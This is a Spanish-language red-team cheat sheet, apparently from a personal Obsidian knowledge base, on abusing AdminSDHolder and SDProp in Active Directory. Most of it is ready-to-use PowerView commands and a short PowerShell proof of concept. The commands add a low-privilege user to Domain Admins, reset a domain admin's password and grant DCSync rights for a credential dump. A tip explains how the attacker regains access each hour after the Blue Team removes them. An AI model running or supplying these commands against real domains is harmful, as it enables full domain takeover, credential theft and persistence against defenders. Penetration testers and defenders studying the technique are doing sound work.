---
aliases:
  - AdminSDHolder Exploit
tags:
  - technique/privilege-escalation
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[AdminSDHolder Abuse]]"
  - "[[ACL Abuse]]"
---
# AdminSDHolder Abuse - Abuso del Permiso

> Una vez SDProp propagó el `GenericAll` a los objetos protegidos, `lowpriv` controla a los Domain Admins. El permiso se **restaura solo cada hora** aunque el defensor lo borre.

---

## Re-escalada con el Permiso Propagado

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `Add-DomainGroupMember -Identity 'Domain Admins' -Members lowpriv` | Auto-agregarte a Domain Admins (con el GenericAll propagado) | Re-escalada directa. |
| `Set-DomainUserPassword -Identity da_user -AccountPassword (ConvertTo-SecureString 'New!' -AsPlainText -Force)` | Resetear password de un DA (ForceChangePassword) | Si plantaste solo ResetPassword. |
| `Add-DomainObjectAcl -TargetIdentity da_user -PrincipalIdentity lowpriv -Rights DCSync` | Darte DCSync sobre un DA → dump | Encadenar a DCSync. |
| `Get-DomainGroupMember 'Domain Admins'` | Verificar la membresía tras el abuso | Confirmación. |
^asdh-abuse-use

### PoC

```powershell
# El permiso ya está propagado a Domain Admins → usarlo
Add-DomainGroupMember -Identity 'Domain Admins' -Members lowpriv
Get-DomainGroupMember 'Domain Admins'   # lowpriv ahora es DA
```

> [!tip] Self-healing
> Si el Blue Team te saca de Domain Admins, SDProp vuelve a darte el `GenericAll` en la próxima pasada (~60 min) → te re-agregás. La limpieza real exige revertir el DACL de **AdminSDHolder mismo**, no de los objetos protegidos. Ver [[ACL Abuse]] para las primitivas de abuso de cada ACE.
